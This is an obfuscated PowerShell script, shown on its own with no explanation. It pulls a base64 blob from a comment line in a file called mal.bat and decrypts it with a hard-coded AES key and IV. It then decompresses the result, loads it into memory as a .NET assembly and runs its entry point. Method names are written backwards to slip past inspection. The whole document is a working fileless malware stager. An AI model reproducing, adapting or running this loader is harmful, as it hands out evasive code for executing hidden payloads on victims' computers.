$eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\admin\AppData\Local\Temp\mal.bat').Split([Environment]::NewLine);
 foreach ($YiLGW in $eIfqq) {
    if ($YiLGW.StartsWith(':: ')) { 
        $VuGcO = $YiLGW.Substring(3);
        break;
    };
 };
 $uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO);
 $BacUA = New-Object System.Security.Cryptography.AesManaged;
 $BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC;
 $BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
 $BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');
 $BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==');
 $Nlgap = $BacUA.CreateDecryptor();
 $uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);
 $Nlgap.Dispose();
 $BacUA.Dispose();
 $mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);
 $bTMLk = New-Object System.IO.MemoryStream;
 $NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);
 $NVPbn.CopyTo($bTMLk);
 $NVPbn.Dispose();
 $mNKMr.Dispose();
 $bTMLk.Dispose();
 $uZOcm = $bTMLk.ToArray();
 $gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm);
 $PtfdQ = $gDBNO.EntryPoint;
 $PtfdQ.Invoke($null, (, [string[]] ('')))